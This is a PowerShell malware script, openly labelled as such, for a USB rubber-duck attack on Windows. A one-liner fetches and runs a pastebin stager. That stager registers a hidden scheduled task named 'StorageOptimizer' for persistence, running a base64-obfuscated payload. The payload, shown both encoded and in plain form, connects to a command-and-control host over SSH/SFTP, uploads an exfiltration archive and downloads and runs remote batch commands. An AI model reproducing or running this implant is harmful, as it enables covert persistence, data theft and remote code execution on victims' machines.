#This malware needs .net 4.5 and powershell 3.0 (or more)

#Script to put on eg. rubber duck: powershell -command Invoke-Expression (New-Object Net.WebClient).DownloadString(\"https://pastebin.com/raw/zWCQyzph\") 
#the pastebin need to be the following stager: (the trig and the register-scheduledjob only

#Part of the script to use to get persistence on target pc
$T = New-ScheduledTaskTrigger -Once -RandomDelay 00:05:00 -RepetitionDuration (New-TimeSpan -Days 10000) -At (Get-Date).AddSeconds(10) -RepetitionInterval (New-TimeSpan -Minutes 15);
$P = New-ScheduledTaskPrincipal $env:USERNAME;
$S = New-ScheduledTaskSettingsSet ;
$A = New-ScheduledTaskAction -Execute "powershell.exe" -Argument '-windowstyle hidden -command iex ([System.Text.Encoding]::Ascii.GetString([System.Convert]::FromBase64String(\"ICAgIFNldC1FeGVjdXRpb25Qb2xpY3kgVW5yZXN0cmljdGVkIC1Gb3JjZSAtU2NvcGUgQ3VycmVudFVzZXI7CiAgICAkZmlsZSA9ICIkKCRlbnY6VEVNUClcUG9zaC1TU0guemlwIjsgCiAgICBpZiAoIShUZXN0LVBhdGggJGZpbGUpKSB7CiAgICAgICAgW05ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VjdXJpdHlQcm90b2NvbCA9IFtOZXQuU2VjdXJpdHlQcm90b2NvbFR5cGVdOjpUbHMxMgogICAgICAgICR3ZWJjbGllbnQgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuV2ViQ2xpZW50OwogICAgICAgICR1cmwgPSAiaHR0cHM6Ly9naXRodWIuY29tL2RhcmtvcGVyYXRvci9Qb3NoLVNTSC9hcmNoaXZlL21hc3Rlci56aXAiOwogICAgICAgICR3ZWJjbGllbnQuRG93bmxvYWRGaWxlKCR1cmwsJGZpbGUpOwogICAgfQogICAgJHRhcmdldG9uZGlzayA9ICIkKCRlbnY6VEVNUCkiOwogICAgaWYgKCEoVGVzdC1QYXRoICgkdGFyZ2V0b25kaXNrKyJcUG9zaC1TU0hcUG9zaC1TU0gucHNtMSIpKSkgewogICAgICAgIE5ldy1JdGVtIC1JdGVtVHlwZSBEaXJlY3RvcnkgLUZvcmNlIC1QYXRoICR0YXJnZXRvbmRpc2sgfCBvdXQtbnVsbDsKICAgICAgICAkc2hlbGxfYXBwPW5ldy1vYmplY3QgLWNvbSBzaGVsbC5hcHBsaWNhdGlvbjsKICAgICAgICAkemlwX2ZpbGUgPSAkc2hlbGxfYXBwLm5hbWVzcGFjZSgkZmlsZSk7CiAgICAgICAgJGRlc3RpbmF0aW9uID0gJHNoZWxsX2FwcC5uYW1lc3BhY2UoJHRhcmdldG9uZGlzayk7CiAgICAgICAgJGRlc3RpbmF0aW9uLkNvcHloZXJlKCR6aXBfZmlsZS5pdGVtcygpLCAweDEwKTsKICAgICAgICBSZW5hbWUtSXRlbSAtUGF0aCAoJHRhcmdldG9uZGlzaysiXFBvc2gtU1NILW1hc3RlciIpIC1OZXdOYW1lICJQb3NoLVNTSCIgLUZvcmNlOwogICAgfSAKICAgIEltcG9ydC1Nb2R1bGUgKCR0YXJnZXRvbmRpc2srIlxQb3NoLVNTSFxQb3NoLVNTSC5wc2QxIik7IAoKICAgICRoID0gImMyX2hvc3QubWFsd2FyZSI7CiAgICAkcG9ydCA9IDQ0MzsKICAgICR1c2VyID0gImMydGVzdCI7CiAgICAkcGFzc3dvcmQgPSBDb252ZXJ0VG8tU2VjdXJlU3RyaW5nICdjMnRlc3QnIC1Bc1BsYWluVGV4dCAtRm9yY2U7CiAgICAkQ3JlZGVudGlhbCA9IE5ldy1PYmplY3QgU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWwgKCR1c2VyLCAkcGFzc3dvcmQpOwogICAgJHNzID0gTmV3LVNTSFNlc3Npb24gLUNvbXB1dGVyTmFtZSAkaCAtQ3JlZGVudGlhbCAkQ3JlZGVudGlhbCAtUG9ydCAkcG9ydCAtRm9yY2U7CiAgICAjTG9nIHN0YXJ0CiAgICBJbnZva2UtU1NIQ29tbWFuZCAtQ29tbWFuZCAoInRvdWNoIGxhdGVzdF9zdGFydF8iKygkZW52OkNPTVBVVEVSTkFNRSkpIC1TU0hTZXNzaW9uICRzczsKCiAgICAkcyA9IE5ldy1TRlRQU2Vzc2lvbiAtQ29tcHV0ZXJOYW1lICRoIC1DcmVkZW50aWFsICRDcmVkZW50aWFsIC1Qb3J0ICRwb3J0IC1Gb3JjZTsKICAgIGlmIChUZXN0LXBhdGggIiQoJGVudjpURU1QKWV4ZmlsZGF0YS56aXAiKSB7CiAgICAgICAgU2V0LVNGVFBGaWxlIC1TRlRQU2Vzc2lvbiAkcyAtTG9jYWxGaWxlICIkKCRlbnY6VEVNUClleGZpbGRhdGEuemlwIiAtUmVtb3RlUGF0aCAiZXhmaWxfJChHZXQtRGF0ZSlfJCgkZW52OkNPTVBVVEVSTkFNRSkuemlwIjsKICAgICAgICBSZW1vdmUtSXRlbSAtUGF0aCAiJCgkZW52OlRFTVApZXhmaWxkYXRhLnppcCIgLUZvcmNlOyAgICAgICAgIAogICAgfQogICAgaWYgKFRlc3QtU0ZUUFBhdGggLVNGVFBTZXNzaW9uICRzICJjb21tYW5kXyQoJGVudjpDT01QVVRFUk5BTUUpLnppcCIpIHsKICAgICAgICBHZXQtU0ZUUEZpbGUgLVNGVFBTZXNzaW9uICRzIC1SZW1vdGVGaWxlICJjb21tYW5kXyQoJGVudjpDT01QVVRFUk5BTUUpLnppcCIgLUxvY2FsUGF0aCAiJCgkZW52OlRFTVApY29tbWFuZC56aXAiIC1PdmVyd3JpdGU7CiAgICAgICAgUmVtb3ZlLVNGVFBJdGVtIC1TRlRQU2Vzc2lvbiAkcyAtUGF0aCAiY29tbWFuZF8kKCRlbnY6Q09NUFVURVJOQU1FKS56aXAiIC1Gb3JjZTsKICAgICAgICAkdG1wID0gTmV3LVRlbXBvcmFyeUZpbGU7CiAgICAgICAgUmVtb3ZlLUl0ZW0gLVBhdGggJHRtcCAtZm9yY2U7CiAgICAgICAgTmV3LUl0ZW0gLVBhdGggJHRtcCAtVHlwZSBkaXJlY3Rvcnk7CiAgICAgICAgJGNvbW1hbmRfcGF0aCA9ICR0bXA7CiAgICAgICAgJHNoZWxsX2FwcD1uZXctb2JqZWN0IC1jb20gc2hlbGwuYXBwbGljYXRpb247CiAgICAgICAgJHogPSAkc2hlbGxfYXBwLm5hbWVzcGFjZSgiJCgkZW52OlRFTVApY29tbWFuZC56aXAiKTsKICAgICAgICAkZCA9ICRzaGVsbF9hcHAubmFtZXNwYWNlKCRjb21tYW5kX3BhdGgpOwogICAgICAgICRkLkNvcHloZXJlKCR6aXBfZmlsZS5pdGVtcygpLCAweDEwKTsKICAgICAgICBjbWQuZXhlIC9jICRjb21tYW5kX3BhdGgrIlxvcHRpbWl6ZS5iYXQiOwogICAgICAgIFJlbW92ZS1JdGVtIC1QYXRoICIkKCRlbnY6VEVNUCljb21tYW5kLnppcCIgLUZvcmNlOwogICAgICAgIFJlbW92ZS1JdGVtIC1SZWN1cnNlIC1QYXRoICRjb21tYW5kX3BhdGggLUZvcmNlOwogICAgfQoKICAgICRzLkRpc2Nvbm5lY3QoKTsKCiAgICAjTG9nIGVuZAogICAgSW52b2tlLVNTSENvbW1hbmQgLUNvbW1hbmQgKCJ0b3VjaCBsYXRlc3RfZW5kXyIrKCRlbnY6Q09NUFVURVJOQU1FKSkgLVNTSFNlc3Npb24gJHNzOwogICAgJHNzLkRpc2Nvbm5lY3QoKTsK\")))';
$D = New-ScheduledTask -Action $A -Principal $P -Trigger $T -Settings $S;
Register-ScheduledTask StorageOptimizer -InputObject $D | Out-Null;



#The script to base64 encode and use in persistence part
    Set-ExecutionPolicy Unrestricted -Force -Scope CurrentUser;
    $file = "$($env:TEMP)\Posh-SSH.zip"; 
    if (!(Test-Path $file)) {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        $webclient = New-Object System.Net.WebClient;
        $url = "https://github.com/darkoperator/Posh-SSH/archive/master.zip";
        $webclient.DownloadFile($url,$file);
    }
    $targetondisk = "$($env:TEMP)";
    if (!(Test-Path ($targetondisk+"\Posh-SSH\Posh-SSH.psm1"))) {
        New-Item -ItemType Directory -Force -Path $targetondisk | out-null;
        $shell_app=new-object -com shell.application;
        $zip_file = $shell_app.namespace($file);
        $destination = $shell_app.namespace($targetondisk);
        $destination.Copyhere($zip_file.items(), 0x10);
        Rename-Item -Path ($targetondisk+"\Posh-SSH-master") -NewName "Posh-SSH" -Force;
    } 
    Import-Module ($targetondisk+"\Posh-SSH\Posh-SSH.psd1"); 

    $h = "c2_host.malware";
    $port = 443;
    $user = "c2test";
    $password = ConvertTo-SecureString 'c2test' -AsPlainText -Force;
    $Credential = New-Object System.Management.Automation.PSCredential ($user, $password);
    $ss = New-SSHSession -ComputerName $h -Credential $Credential -Port $port -Force;
    #Log start
    Invoke-SSHCommand -Command ("touch latest_start_"+($env:COMPUTERNAME)) -SSHSession $ss;

    $s = New-SFTPSession -ComputerName $h -Credential $Credential -Port $port -Force;
    if (Test-path "$($env:TEMP)exfildata.zip") {
        Set-SFTPFile -SFTPSession $s -LocalFile "$($env:TEMP)exfildata.zip" -RemotePath "exfil_$(Get-Date)_$($env:COMPUTERNAME).zip";
        Remove-Item -Path "$($env:TEMP)exfildata.zip" -Force;         
    }
    if (Test-SFTPPath -SFTPSession $s "command_$($env:COMPUTERNAME).zip") {
        Get-SFTPFile -SFTPSession $s -RemoteFile "command_$($env:COMPUTERNAME).zip" -LocalPath "$($env:TEMP)command.zip" -Overwrite;
        Remove-SFTPItem -SFTPSession $s -Path "command_$($env:COMPUTERNAME).zip" -Force;
        $tmp = New-TemporaryFile;
        Remove-Item -Path $tmp -force;
        New-Item -Path $tmp -Type directory;
        $command_path = $tmp;
        $shell_app=new-object -com shell.application;
        $z = $shell_app.namespace("$($env:TEMP)command.zip");
        $d = $shell_app.namespace($command_path);
        $d.Copyhere($zip_file.items(), 0x10);
        cmd.exe /c $command_path+"\optimize.bat";
        Remove-Item -Path "$($env:TEMP)command.zip" -Force;
        Remove-Item -Recurse -Path $command_path -Force;
    }

    $s.Disconnect();

    #Log end
    Invoke-SSHCommand -Command ("touch latest_end_"+($env:COMPUTERNAME)) -SSHSession $ss;
    $ss.Disconnect();

